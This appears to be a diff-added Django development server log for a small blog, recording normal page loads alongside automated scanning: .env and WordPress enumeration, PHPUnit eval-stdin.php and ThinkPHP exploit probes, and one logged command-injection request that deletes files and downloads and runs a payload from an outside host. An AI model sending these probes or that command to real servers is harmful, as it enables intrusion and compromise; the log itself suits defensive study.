+  File "/root/myvenv/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/usr/lib/python3.6/socket.py", line 586, in readinto
+    return self._sock.recv_into(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+----------------------------------------
+Not Found: /.well-known/security.txt
+[19/Jan/2021 21:58:44] "GET /.well-known/security.txt HTTP/1.1" 404 2284
+----------------------------------------
+Exception happened during processing of request from ('198.20.69.98', 34658)
+Traceback (most recent call last):
+  File "/usr/lib/python3.6/socketserver.py", line 654, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.6/socketserver.py", line 364, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.6/socketserver.py", line 724, in __init__
+    self.handle()
+  File "/root/myvenv/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 174, in handle
+    self.handle_one_request()
+  File "/root/myvenv/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/usr/lib/python3.6/socket.py", line 586, in readinto
+    return self._sock.recv_into(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+----------------------------------------
+[19/Jan/2021 21:58:47] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
+----------------------------------------
+Exception happened during processing of request from ('198.20.69.98', 34576)
+Traceback (most recent call last):
+  File "/usr/lib/python3.6/socketserver.py", line 654, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.6/socketserver.py", line 364, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.6/socketserver.py", line 724, in __init__
+    self.handle()
+  File "/root/myvenv/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 174, in handle
+    self.handle_one_request()
+  File "/root/myvenv/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/usr/lib/python3.6/socket.py", line 586, in readinto
+    return self._sock.recv_into(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+----------------------------------------
+[19/Jan/2021 22:04:39] "GET / HTTP/1.0" 200 2027
+Not Found: /ReportServer
+[19/Jan/2021 22:11:14] "GET /ReportServer HTTP/1.1" 404 2248
+Not Found: /api/jsonws/invoke
+[19/Jan/2021 22:17:56] "POST /api/jsonws/invoke HTTP/1.1" 404 2267
+Not Found: /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+[19/Jan/2021 22:17:56] "POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 2366
+Not Found: /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+[19/Jan/2021 22:17:56] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 2365
+Not Found: /solr/admin/info/system
+[19/Jan/2021 22:17:56] "GET /solr/admin/info/system?wt=json HTTP/1.1" 404 2289
+Not Found: /console/
+[19/Jan/2021 22:17:57] "GET /console/ HTTP/1.1" 404 2239
+[19/Jan/2021 22:17:57] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 200 2027
+Not Found: /wp-content/plugins/wp-file-manager/readme.txt
+[19/Jan/2021 22:17:57] "GET /wp-content/plugins/wp-file-manager/readme.txt HTTP/1.1" 404 2350
+Not Found: /index.php
+[19/Jan/2021 22:17:57] "GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21 HTTP/1.1" 404 2361
+[19/Jan/2021 22:17:58] "GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> HTTP/1.1" 200 2027
+Not Found: /Autodiscover/Autodiscover.xml
+[19/Jan/2021 22:17:58] "POST /Autodiscover/Autodiscover.xml HTTP/1.1" 404 2303
+[19/Jan/2021 22:28:52] code 400, message Bad request syntax ('\x03\x00\x00\x13\x0eà\x00\x00\x00\x00\x00\x01\x00\x08\x00\x03\x00\x00\x00')
+[19/Jan/2021 22:28:52] "  à          " 400 -
+[19/Jan/2021 22:49:29] "GET / HTTP/1.1" 200 2027
+Not Found: /config/getuser
+[19/Jan/2021 22:54:29] "GET /config/getuser?index=0 HTTP/1.1" 404 2265
+Not Found: /wp-login.php
+[19/Jan/2021 23:02:55] "GET /wp-login.php HTTP/1.1" 404 2247
+[19/Jan/2021 23:17:56] "GET / HTTP/1.1" 200 2027
+[19/Jan/2021 23:17:56] "GET /static/css/blog_font.css HTTP/1.1" 200 869
+[19/Jan/2021 23:17:56] "GET /static/css/blog_base_total.css HTTP/1.1" 200 70
+[19/Jan/2021 23:17:56] "GET /static/css/blog_base_header.css HTTP/1.1" 200 1053
+[19/Jan/2021 23:17:56] "GET /static/css/blog_base_nav.css HTTP/1.1" 200 748
+[19/Jan/2021 23:17:57] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
+[19/Jan/2021 23:17:59] "GET / HTTP/1.1" 200 2027
+[19/Jan/2021 23:18:02] "GET /auth/signup HTTP/1.1" 200 5517
+[19/Jan/2021 23:18:02] "GET /static/css/blog_signup.css HTTP/1.1" 200 1688
+[19/Jan/2021 23:18:03] "GET /auth/login HTTP/1.1" 200 2747
+[19/Jan/2021 23:18:03] "GET /static/css/blog_login.css HTTP/1.1" 200 1612
+Not Found: /wp-login.php
+[19/Jan/2021 23:33:56] "GET /wp-login.php HTTP/1.1" 404 2245
+[20/Jan/2021 00:11:09] "HEAD / HTTP/1.0" 200 2027
+Not Found: /login
+[20/Jan/2021 00:20:55] "GET /login HTTP/1.0" 404 2226
+Not Found: /jenkins/login
+[20/Jan/2021 00:20:55] "GET /jenkins/login HTTP/1.0" 404 2250
+Not Found: /manager/html
+[20/Jan/2021 00:20:55] "GET /manager/html HTTP/1.0" 404 2247
+[20/Jan/2021 01:29:25] "GET / HTTP/1.1" 200 2027
+Not Found: /TP/public/index.php
+[20/Jan/2021 01:34:20] "GET /TP/public/index.php HTTP/1.1" 404 2269
+Not Found: /TP/index.php
+[20/Jan/2021 01:34:20] "GET /TP/index.php HTTP/1.1" 404 2248
+Not Found: /thinkphp/html/public/index.php
+[20/Jan/2021 01:34:20] "GET /thinkphp/html/public/index.php HTTP/1.1" 404 2302
+Not Found: /html/public/index.php
+[20/Jan/2021 01:34:21] "GET /html/public/index.php HTTP/1.1" 404 2275
+Not Found: /public/index.php
+[20/Jan/2021 01:34:21] "GET /public/index.php HTTP/1.1" 404 2260
+Not Found: /TP/html/public/index.php
+[20/Jan/2021 01:34:21] "GET /TP/html/public/index.php HTTP/1.1" 404 2284
+Not Found: /elrekt.php
+[20/Jan/2021 01:34:21] "GET /elrekt.php HTTP/1.1" 404 2242
+Not Found: /index.php
+[20/Jan/2021 01:34:21] "GET /index.php HTTP/1.1" 404 2239
+[20/Jan/2021 01:34:22] "GET / HTTP/1.1" 200 2027
+[20/Jan/2021 01:37:05] "GET / HTTP/1.1" 200 2027
+[20/Jan/2021 01:37:05] "GET / HTTP/1.1" 200 2027
+Not Found: /wp-includes/wlwmanifest.xml
+[20/Jan/2021 01:37:06] "GET /wp-includes/wlwmanifest.xml HTTP/1.1" 404 2292
+Not Found: /xmlrpc.php
+[20/Jan/2021 01:37:10] "GET /xmlrpc.php?rsd HTTP/1.1" 404 2245
+[20/Jan/2021 01:37:11] "GET / HTTP/1.1" 200 2027
+Not Found: /blog/wp-includes/wlwmanifest.xml
+[20/Jan/2021 01:37:12] "GET /blog/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2307
+Not Found: /web/wp-includes/wlwmanifest.xml
+[20/Jan/2021 01:37:13] "GET /web/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2304
+Not Found: /wordpress/wp-includes/wlwmanifest.xml
+[20/Jan/2021 01:37:13] "GET /wordpress/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2322
+[20/Jan/2021 01:39:33] code 400, message Bad request syntax ('\x03\x00\x00\x13\x0eà\x00\x00\x00\x00\x00\x01\x00\x08\x00\x03\x00\x00\x00')
+[20/Jan/2021 01:39:33] "  à          " 400 -
+Not Found: /website/wp-includes/wlwmanifest.xml
+[20/Jan/2021 01:39:33] "GET /website/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2316
+Not Found: /wp/wp-includes/wlwmanifest.xml
+[20/Jan/2021 01:39:34] "GET /wp/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2301
+Not Found: /news/wp-includes/wlwmanifest.xml
+[20/Jan/2021 01:39:35] "GET /news/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2307
+Not Found: /2018/wp-includes/wlwmanifest.xml
+[20/Jan/2021 01:39:35] "GET /2018/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2307
+Not Found: /2019/wp-includes/wlwmanifest.xml
+[20/Jan/2021 01:39:38] "GET /2019/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2307
+Not Found: /shop/wp-includes/wlwmanifest.xml
+[20/Jan/2021 01:39:38] "GET /shop/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2307
+Not Found: /wp1/wp-includes/wlwmanifest.xml
+[20/Jan/2021 01:39:39] "GET /wp1/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2304
+Not Found: /test/wp-includes/wlwmanifest.xml
+[20/Jan/2021 01:39:40] "GET /test/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2307
+Not Found: /media/wp-includes/wlwmanifest.xml
+[20/Jan/2021 01:39:41] "GET /media/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2310
+Not Found: /wp2/wp-includes/wlwmanifest.xml
+[20/Jan/2021 01:39:42] "GET /wp2/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2304
+Not Found: /site/wp-includes/wlwmanifest.xml
+[20/Jan/2021 01:39:42] "GET /site/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2307
+Not Found: /cms/wp-includes/wlwmanifest.xml
+[20/Jan/2021 01:39:44] "GET /cms/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2304
+Not Found: /sito/wp-includes/wlwmanifest.xml
+[20/Jan/2021 01:39:44] "GET /sito/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2307
+Not Found: /login
+[20/Jan/2021 02:03:49] "GET /login HTTP/1.0" 404 2226
+Not Found: /jenkins/login
+[20/Jan/2021 02:03:49] "GET /jenkins/login HTTP/1.0" 404 2250
+Not Found: /manager/html
+[20/Jan/2021 02:03:50] "GET /manager/html HTTP/1.0" 404 2247
+[20/Jan/2021 02:05:51] "GET / HTTP/1.1" 200 2027
+Not Found: /.env
+[20/Jan/2021 02:05:51] "GET /.env HTTP/1.1" 404 2224
+Not Found: /.remote
+[20/Jan/2021 02:05:52] "GET /.remote HTTP/1.1" 404 2233
+Not Found: /.local
+[20/Jan/2021 02:05:52] "GET /.local HTTP/1.1" 404 2230
+Not Found: /.production
+[20/Jan/2021 02:05:52] "GET /.production HTTP/1.1" 404 2245
+Not Found: //vendor/.env
+[20/Jan/2021 02:05:53] "GET //vendor/.env HTTP/1.1" 404 2248
+Not Found: //lib/.env
+[20/Jan/2021 02:05:53] "GET //lib/.env HTTP/1.1" 404 2239
+Not Found: //lab/.env
+[20/Jan/2021 02:05:54] "GET //lab/.env HTTP/1.1" 404 2239
+Not Found: //cronlab/.env
+[20/Jan/2021 02:05:54] "GET //cronlab/.env HTTP/1.1" 404 2251
+Not Found: //cron/.env
+[20/Jan/2021 02:05:55] "GET //cron/.env HTTP/1.1" 404 2242
+Not Found: //core/.env
+[20/Jan/2021 02:05:55] "GET //core/.env HTTP/1.1" 404 2242
+Not Found: //core/app/.env
+[20/Jan/2021 02:05:55] "GET //core/app/.env HTTP/1.1" 404 2254
+Not Found: //core/Datavase/.env
+[20/Jan/2021 02:05:56] "GET //core/Datavase/.env HTTP/1.1" 404 2269
+Not Found: //database/.env
+[20/Jan/2021 02:05:56] "GET //database/.env HTTP/1.1" 404 2254
+Not Found: //config/.env
+[20/Jan/2021 02:05:57] "GET //config/.env HTTP/1.1" 404 2248
+Not Found: //assets/.env
+[20/Jan/2021 02:05:57] "GET //assets/.env HTTP/1.1" 404 2248
+Not Found: //app/.env
+[20/Jan/2021 02:05:58] "GET //app/.env HTTP/1.1" 404 2239
+Not Found: //apps/.env
+[20/Jan/2021 02:05:58] "GET //apps/.env HTTP/1.1" 404 2242
+Not Found: //uploads/.env
+[20/Jan/2021 02:05:58] "GET //uploads/.env HTTP/1.1" 404 2251
+Not Found: //sitemaps/.env
+[20/Jan/2021 02:05:59] "GET //sitemaps/.env HTTP/1.1" 404 2254
+Not Found: //saas/.env
+[20/Jan/2021 02:05:59] "GET //saas/.env HTTP/1.1" 404 2242
+Not Found: //api/.env
+[20/Jan/2021 02:06:00] "GET //api/.env HTTP/1.1" 404 2239
+Not Found: //psnlink/.env
+[20/Jan/2021 02:06:00] "GET //psnlink/.env HTTP/1.1" 404 2251
+Not Found: //exapi/.env
+[20/Jan/2021 02:06:00] "GET //exapi/.env HTTP/1.1" 404 2245
+Not Found: //site/.env
+[20/Jan/2021 02:06:01] "GET //site/.env HTTP/1.1" 404 2242
+Not Found: //admin/.env
+[20/Jan/2021 02:06:01] "GET //admin/.env HTTP/1.1" 404 2245
+Not Found: //web/.env
+[20/Jan/2021 02:06:02] "GET //web/.env HTTP/1.1" 404 2239
+Not Found: //public/.env
+[20/Jan/2021 02:06:02] "GET //public/.env HTTP/1.1" 404 2248
+Not Found: //en/.env
+[20/Jan/2021 02:06:03] "GET //en/.env HTTP/1.1" 404 2236
+Not Found: //tools/.env
+[20/Jan/2021 02:06:03] "GET //tools/.env HTTP/1.1" 404 2245
+Not Found: //v1/.env
+[20/Jan/2021 02:06:03] "GET //v1/.env HTTP/1.1" 404 2236
+Not Found: //v2/.env
+[20/Jan/2021 02:06:04] "GET //v2/.env HTTP/1.1" 404 2236
+Not Found: //administrator/.env
+[20/Jan/2021 02:06:04] "GET //administrator/.env HTTP/1.1" 404 2269
+Not Found: //laravel/.env
+[20/Jan/2021 02:06:05] "GET //laravel/.env HTTP/1.1" 404 2251
+Forbidden (CSRF cookie not set.): /
+[20/Jan/2021 02:06:05] "POST / HTTP/1.1" 403 2994
+Not Found: //admin/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+[20/Jan/2021 02:06:06] "POST //admin/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 2384
+Not Found: //api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+[20/Jan/2021 02:06:06] "POST //api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 2378
+Not Found: //backup/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+[20/Jan/2021 02:06:07] "POST //backup/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 2387
+Not Found: //blog/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+[20/Jan/2021 02:06:07] "POST //blog/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 2381
+Not Found: //cms/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+[20/Jan/2021 02:06:08] "POST //cms/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 2378
+Not Found: //demo/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+[20/Jan/2021 02:06:08] "POST //demo/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 2381
+Not Found: //dev/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+[20/Jan/2021 02:06:08] "POST //dev/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 2378
+Not Found: //laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+[20/Jan/2021 02:06:09] "POST //laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 2390
+Not Found: //lib/phpunit/Util/PHP/eval-stdin.php
+[20/Jan/2021 02:06:09] "POST //lib/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 404 2321
+Not Found: //lib/phpunit/phpunit/Util/PHP/eval-stdin.php
+[20/Jan/2021 02:06:10] "POST //lib/phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 404 2345
+Not Found: //lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+[20/Jan/2021 02:06:10] "POST //lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 2357
+Not Found: //lib/phpunit/src/Util/PHP/eval-stdin.php
+[20/Jan/2021 02:06:11] "POST //lib/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 2333
+Not Found: //new/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+[20/Jan/2021 02:06:11] "POST //new/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 2378
+Not Found: //old/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+[20/Jan/2021 02:06:11] "POST //old/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 2378
+Not Found: //panel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+[20/Jan/2021 02:06:12] "POST //panel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 2384
+Not Found: //phpunit/Util/PHP/eval-stdin.php
+[20/Jan/2021 02:06:12] "POST //phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 404 2309
+Not Found: //phpunit/phpunit/Util/PHP/eval-stdin.php
+[20/Jan/2021 02:06:13] "POST //phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 404 2333
+Not Found: //phpunit/phpunit/src/Util/PHP/eval-stdin.php
+[20/Jan/2021 02:06:13] "POST //phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 2345
+Not Found: //phpunit/src/Util/PHP/eval-stdin.php
+[20/Jan/2021 02:06:14] "POST //phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 2321
+Not Found: //protected/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+[20/Jan/2021 02:06:14] "POST //protected/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 2396
+Not Found: //sites/all/libraries/mailchimp/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+[20/Jan/2021 02:06:14] "POST //sites/all/libraries/mailchimp/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 2456
+Not Found: //vendor/phpunit/Util/PHP/eval-stdin.php
+[20/Jan/2021 02:06:15] "POST //vendor/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 404 2330
+Not Found: //vendor/phpunit/phpunit/Util/PHP/eval-stdin.php
+[20/Jan/2021 02:06:15] "POST //vendor/phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 404 2354
+Not Found: //vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+[20/Jan/2021 02:06:16] "POST //vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 2366
+Not Found: //vendor/phpunit/src/Util/PHP/eval-stdin.php
+[20/Jan/2021 02:06:16] "POST //vendor/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 2342
+Not Found: //wp-content/plugins/cloudflare/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+[20/Jan/2021 02:06:16] "POST //wp-content/plugins/cloudflare/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 2456
+Not Found: //wp-content/plugins/dzs-videogallery/class_parts/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+[20/Jan/2021 02:06:17] "POST //wp-content/plugins/dzs-videogallery/class_parts/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 2510
+Not Found: //wp-content/plugins/jekyll-exporter/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+[20/Jan/2021 02:06:17] "POST //wp-content/plugins/jekyll-exporter/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 2471
+Not Found: //wp-content/plugins/mm-plugin/inc/vendors/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+[20/Jan/2021 02:06:18] "POST //wp-content/plugins/mm-plugin/inc/vendors/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 2489
+Not Found: //www/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+[20/Jan/2021 02:06:18] "POST //www/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 2378
+[20/Jan/2021 03:03:18] "GET /auth/login HTTP/1.1" 200 2747
+[20/Jan/2021 03:03:22] "GET /auth/login HTTP/1.1" 200 2747
+[20/Jan/2021 03:03:22] "GET /static/css/blog_base_header.css HTTP/1.1" 304 0
+[20/Jan/2021 03:03:22] "GET /static/css/blog_base_nav.css HTTP/1.1" 304 0
+[20/Jan/2021 03:03:22] "GET /static/css/blog_login.css HTTP/1.1" 304 0
+[20/Jan/2021 03:03:22] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
+[20/Jan/2021 03:14:52] code 400, message Bad request syntax ('SSH-2.0-libssh2_1.7.0')
+[20/Jan/2021 03:14:52] "SSH-2.0-libssh2_1.7.0" 400 -
+[20/Jan/2021 04:50:50] "GET / HTTP/1.1" 200 2027
+[20/Jan/2021 05:04:39] "HEAD / HTTP/1.0" 200 2027
+----------------------------------------
+Exception happened during processing of request from ('61.219.11.153', 62436)
+Traceback (most recent call last):
+  File "/usr/lib/python3.6/socketserver.py", line 654, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.6/socketserver.py", line 364, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.6/socketserver.py", line 724, in __init__
+    self.handle()
+  File "/root/myvenv/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 172, in handle
+    self.handle_one_request()
+  File "/root/myvenv/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/usr/lib/python3.6/socket.py", line 586, in readinto
+    return self._sock.recv_into(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+----------------------------------------
+Not Found: /robots.txt
+[20/Jan/2021 06:11:54] "GET /robots.txt HTTP/1.1" 404 2241
+[20/Jan/2021 06:11:57] "GET /auth/login HTTP/1.1" 200 2747
+[20/Jan/2021 06:14:11] "HEAD / HTTP/1.0" 200 2027
+[20/Jan/2021 06:14:13] "GET / HTTP/1.1" 200 2027
+[20/Jan/2021 06:14:16] "GET /admin/ HTTP/1.1" 302 0
+[20/Jan/2021 06:14:17] "GET /admin/login/?next=/admin/ HTTP/1.1" 200 2214
+Not Found: /manager/
+[20/Jan/2021 06:14:20] "GET /manager/ HTTP/1.1" 404 2233
+Not Found: /admin/content/sitetree/
+[20/Jan/2021 06:14:24] "GET /admin/content/sitetree/ HTTP/1.1" 404 4026
+Not Found: /simpla/
+[20/Jan/2021 06:14:27] "GET /simpla/ HTTP/1.0" 404 2230
+Not Found: /js/mage/cookies.js
+[20/Jan/2021 06:14:28] "GET /js/mage/cookies.js HTTP/1.1" 404 2263
+[20/Jan/2021 06:19:40] "HEAD / HTTP/1.1" 200 2027
+[20/Jan/2021 06:30:06] "HEAD / HTTP/1.0" 200 2027
+Not Found: /login
+[20/Jan/2021 07:18:10] "GET /login HTTP/1.0" 404 2226
+[20/Jan/2021 07:53:07] "GET / HTTP/1.1" 200 2027
+[20/Jan/2021 08:04:35] "GET / HTTP/1.1" 200 2027
+Not Found: /portal/redlion
+[20/Jan/2021 08:14:53] "GET /portal/redlion HTTP/1.1" 404 2254
+[20/Jan/2021 08:18:30] "GET / HTTP/1.1" 200 2027
+[20/Jan/2021 08:30:13] "GET / HTTP/1.0" 200 2027
+[20/Jan/2021 08:56:39] "GET / HTTP/1.1" 200 2027
+Not Found: /robots.txt
+[20/Jan/2021 09:14:07] "GET /robots.txt HTTP/1.1" 404 2241
+[20/Jan/2021 09:14:10] "GET /auth/login HTTP/1.1" 200 2747
+[20/Jan/2021 09:59:31] "GET / HTTP/1.1" 200 2027
+Not Found: /robots.txt
+[20/Jan/2021 10:38:37] "GET /robots.txt HTTP/1.1" 404 2241
+[20/Jan/2021 10:38:38] "GET / HTTP/1.1" 200 2027
+[20/Jan/2021 11:29:16] "GET / HTTP/1.1" 200 2027
+Not Found: /actuator/health
+[20/Jan/2021 11:39:14] "GET /actuator/health HTTP/1.1" 404 2257
+[20/Jan/2021 11:56:45] "GET / HTTP/1.1" 200 2027
+Not Found: /config/getuser
+[20/Jan/2021 12:03:42] "GET /config/getuser?index=0 HTTP/1.1" 404 2265
+[20/Jan/2021 12:22:27] "GET / HTTP/1.1" 200 2027
+[20/Jan/2021 13:02:43] "GET / HTTP/1.1" 200 2027
+[20/Jan/2021 13:04:25] code 400, message Bad request syntax ('GET /shell?cd+/tmp;rm+-rf+*;wget+ debes.venus.lol/jaws;sh+/tmp/jaws HTTP/1.1')
+[20/Jan/2021 13:04:25] "GET /shell?cd+/tmp;rm+-rf+*;wget+ debes.venus.lol/jaws;sh+/tmp/jaws HTTP/1.1" 400 -
+[20/Jan/2021 13:26:00] "GET / HTTP/1.1" 200 2027
+[20/Jan/2021 13:52:17] "GET / HTTP/1.1" 200 2027
+[20/Jan/2021 13:53:35] "GET / HTTP/1.1" 200 2027
+[20/Jan/2021 13:53:36] "GET / HTTP/1.1" 200 2027
+Not Found: /wp-includes/wlwmanifest.xml
+[20/Jan/2021 13:53:36] "GET /wp-includes/wlwmanifest.xml HTTP/1.1" 404 2292
+Not Found: /xmlrpc.php
+[20/Jan/2021 13:53:37] "GET /xmlrpc.php?rsd HTTP/1.1" 404 2245
+[20/Jan/2021 13:53:37] "GET / HTTP/1.1" 200 2027
+Not Found: /blog/wp-includes/wlwmanifest.xml
+[20/Jan/2021 13:53:37] "GET /blog/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2307
+Not Found: /web/wp-includes/wlwmanifest.xml
+[20/Jan/2021 13:53:38] "GET /web/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2304
+Not Found: /wordpress/wp-includes/wlwmanifest.xml
+[20/Jan/2021 13:53:38] "GET /wordpress/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2322
+Not Found: /website/wp-includes/wlwmanifest.xml
+[20/Jan/2021 13:53:39] "GET /website/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2316
+Not Found: /wp/wp-includes/wlwmanifest.xml
+[20/Jan/2021 13:53:39] "GET /wp/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2301
+Not Found: /news/wp-includes/wlwmanifest.xml
+[20/Jan/2021 13:53:39] "GET /news/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2307
+Not Found: /2020/wp-includes/wlwmanifest.xml
+[20/Jan/2021 13:53:40] "GET /2020/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2307
+Not Found: /2019/wp-includes/wlwmanifest.xml
+[20/Jan/2021 13:53:40] "GET /2019/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2307
+Not Found: /shop/wp-includes/wlwmanifest.xml
+[20/Jan/2021 13:53:40] "GET /shop/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2307
+Not Found: /wp1/wp-includes/wlwmanifest.xml
+[20/Jan/2021 13:53:41] "GET /wp1/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2304
+Not Found: /test/wp-includes/wlwmanifest.xml
+[20/Jan/2021 13:53:41] "GET /test/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2307
+Not Found: /wp2/wp-includes/wlwmanifest.xml
+[20/Jan/2021 13:53:42] "GET /wp2/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2304
+Not Found: /site/wp-includes/wlwmanifest.xml
+[20/Jan/2021 13:53:42] "GET /site/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2307
+Not Found: /cms/wp-includes/wlwmanifest.xml
+[20/Jan/2021 13:53:42] "GET /cms/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2304
+Not Found: /sito/wp-includes/wlwmanifest.xml
+[20/Jan/2021 13:53:43] "GET /sito/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2307
+[20/Jan/2021 13:58:59] "HEAD / HTTP/1.0" 200 2027
+[20/Jan/2021 14:03:14] "GET / HTTP/1.1" 200 2027
+Not Found: /wp-includes/wlwmanifest.xml
+[20/Jan/2021 14:03:15] "GET /wp-includes/wlwmanifest.xml HTTP/1.1" 404 2292
+Not Found: /xmlrpc.php
+[20/Jan/2021 14:03:15] "GET /xmlrpc.php?rsd HTTP/1.1" 404 2245
+[20/Jan/2021 14:03:16] "GET / HTTP/1.1" 200 2027
+Not Found: /blog/wp-includes/wlwmanifest.xml
+[20/Jan/2021 14:03:17] "GET /blog/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2307
+Not Found: /wordpress/wp-includes/wlwmanifest.xml
+[20/Jan/2021 14:03:17] "GET /wordpress/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2322
+Not Found: /wp/wp-includes/wlwmanifest.xml
+[20/Jan/2021 14:03:18] "GET /wp/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2301
+Not Found: /site/wp-includes/wlwmanifest.xml
+[20/Jan/2021 14:03:18] "GET /site/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2307
